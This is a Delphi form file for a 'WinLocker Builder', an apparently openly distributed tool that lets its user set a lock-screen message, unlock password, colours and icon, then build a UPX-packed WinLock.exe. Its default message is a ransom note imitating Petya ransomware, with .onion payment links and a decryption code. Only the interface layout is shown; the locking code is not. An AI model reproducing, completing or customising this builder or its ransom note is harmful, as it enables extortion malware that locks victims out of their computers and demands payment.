object Form1: TForm1
  Left = 436
  Top = 124
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'WinLocker Builder | Telegram: @kryyaasoft'
  ClientHeight = 537
  ClientWidth = 417
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  Position = poDesktopCenter
  PixelsPerInch = 96
  TextHeight = 13
  object Label1: TLabel
    Left = 0
    Top = 2
    Width = 417
    Height = 16
    Align = alCustom
    Alignment = taCenter
    AutoSize = False
    Caption = 'WinLocker Builder'
    Color = clBlack
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWindowText
    Font.Height = -13
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentColor = False
    ParentFont = False
    Transparent = True
  end
  object Label2: TLabel
    Left = 0
    Top = 523
    Width = 417
    Height = 13
    Align = alCustom
    Alignment = taCenter
    AutoSize = False
    Caption = #1057#1086#1079#1076#1072#1090#1077#1083#1100': @kryyaasoft (telegram)'
  end
  object GroupBox1: TGroupBox
    Left = 8
    Top = 16
    Width = 401
    Height = 257
    Caption = #1058#1077#1082#1089#1090
    TabOrder = 0
    object Edit1: TEdit
      Left = 8
      Top = 16
      Width = 385
      Height = 21
      MaxLength = 70
      TabOrder = 0
      Text = 'You became victim of the PETYA RANSOMWARE!'
    end
    object Memo1: TMemo
      Left = 8
      Top = 40
      Width = 385
      Height = 209
      Lines.Strings = (
        
          'The harddisks of your computer have been encrypted with an milit' +
          'ary grade'
        
          'encryption algorithm. There is no way to restore your data witho' +
          'ut a special'
        
          'key. You can purchase this key on the darknet page shown in step' +
          ' 2.'
        ''
        
          'To purchase your key and restore your data, please follow these ' +
          'three easy'
        'steps:'
        ''
        
          '1. Download the Tor Browser at "https://www.torproject.org/". If' +
          ' you need'
        '    help, please google for "access onion page".'
        '2. Visit one of the following pages with the Tor Browser:'
        ''
        '    http://petya37h9lggpod1.onion/BakaWB'
        '    http://petya5km01aakfd7.onion/BakaWB'
        ''
        '3. Enter your personal decryption code there:'
        ''
        '    tbRoUv-Fs6ZyW-bEWEI7-AXlIsL-DFdTbY-z0RD0M-sZ3OVq-YViv5Q-'
        'J12yQD-jarpSS-'
        '    SCNcQ9-cI9ULO-NCFJzk-YyuHyH-jKwrWW'
        ''
        'If you already purchased your key, please enter it below.')
      TabOrder = 1
    end
  end
  object GroupBox2: TGroupBox
    Left = 8
    Top = 280
    Width = 193
    Height = 73
    Caption = #1055#1072#1088#1086#1083#1100
    TabOrder = 1
    object Edit2: TEdit
      Left = 8
      Top = 16
      Width = 169
      Height = 21
      MaxLength = 30
      TabOrder = 0
    end
    object Button1: TButton
      Left = 8
      Top = 40
      Width = 169
      Height = 25
      Caption = #1057#1083#1091#1095#1072#1081#1085#1099#1081
      TabOrder = 1
      OnClick = Button1Click
    end
  end
  object GroupBox3: TGroupBox
    Left = 216
    Top = 280
    Width = 193
    Height = 73
    Caption = #1055#1086#1087#1099#1090#1082#1080' '#1074#1074#1086#1076#1072' '#1087#1072#1088#1086#1083#1103
    TabOrder = 2
    object Edit3: TEdit
      Left = 8
      Top = 24
      Width = 177
      Height = 21
      MaxLength = 9
      TabOrder = 0
      OnKeyPress = Edit3KeyPress
    end
  end
  object GroupBox4: TGroupBox
    Left = 8
    Top = 360
    Width = 193
    Height = 49
    Caption = #1062#1074#1077#1090' '#1092#1086#1085#1072
    TabOrder = 3
    object ComboBox1: TComboBox
      Left = 8
      Top = 16
      Width = 177
      Height = 21
      ItemHeight = 13
      TabOrder = 0
      Text = 'clRed'
      OnKeyPress = ComboBox1KeyPress
      Items.Strings = (
        'clRed'
        'clOrange'
        'clYellow'
        'clGreen'
        'clCyan'
        'clBlue'
        'clPurple'
        'clBlack'
        'clWhite')
    end
  end
  object GroupBox5: TGroupBox
    Left = 8
    Top = 416
    Width = 193
    Height = 49
    Caption = #1062#1074#1077#1090' '#1090#1077#1082#1089#1090#1072
    TabOrder = 4
    object ComboBox2: TComboBox
      Left = 8
      Top = 16
      Width = 177
      Height = 21
      ItemHeight = 13
      TabOrder = 0
      Text = 'clWhite'
      OnKeyPress = ComboBox2KeyPress
      Items.Strings = (
        'clRed'
        'clOrange'
        'clYellow'
        'clGreen'
        'clCyan'
        'clBlue'
        'clPurple'
        'clBlack'
        'clWhite')
    end
  end
  object CheckBox1: TCheckBox
    Left = 8
    Top = 472
    Width = 401
    Height = 17
    Caption = #1057#1078#1072#1090#1100' '#1092#1072#1081#1083' UPX'
    TabOrder = 5
  end
  object Button2: TButton
    Left = 8
    Top = 496
    Width = 401
    Height = 25
    Caption = #1057#1086#1079#1076#1072#1090#1100' '#1073#1080#1083#1076
    TabOrder = 6
    OnClick = Button2Click
  end
  object GroupBox6: TGroupBox
    Left = 216
    Top = 360
    Width = 193
    Height = 105
    Caption = #1048#1082#1086#1085#1082#1072
    TabOrder = 7
    object Shape1: TShape
      Left = 64
      Top = 16
      Width = 65
      Height = 57
    end
    object Image1: TImage
      Left = 64
      Top = 16
      Width = 65
      Height = 57
      Center = True
    end
    object Button3: TButton
      Left = 8
      Top = 80
      Width = 177
      Height = 17
      Caption = #1042#1099#1073#1088#1072#1090#1100
      TabOrder = 0
      OnClick = Button3Click
    end
  end
  object SaveDialog1: TSaveDialog
    DefaultExt = '.exe'
    FileName = 'WinLock'
    Filter = 'Executable files|.exe'
  end
  object OpenDialog1: TOpenDialog
    DefaultExt = '.ico'
    Left = 56
  end
  object Timer1: TTimer
    Interval = 1
    OnTimer = Timer1Timer
    Left = 392
  end
end
